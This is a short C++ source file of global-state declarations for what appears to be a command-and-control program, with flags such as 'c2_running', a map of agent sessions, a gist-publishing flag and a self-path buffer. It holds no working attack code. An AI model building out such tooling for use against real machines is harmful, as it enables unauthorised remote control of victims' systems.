#include "../include/common_state.h"

#ifdef _WIN32
#include <windows.h>
#endif

// Inisialisasi Global State
std::string global_public_url = "None";
bool global_gist_success = false;
int global_server_port = SERVER_PORT;
std::mutex session_mutex;
std::map<int, AgentSession> active_sessions;
int next_session_id = 1;
bool c2_running = true;
bool is_master_process = false;
char self_path[MAX_PATH];
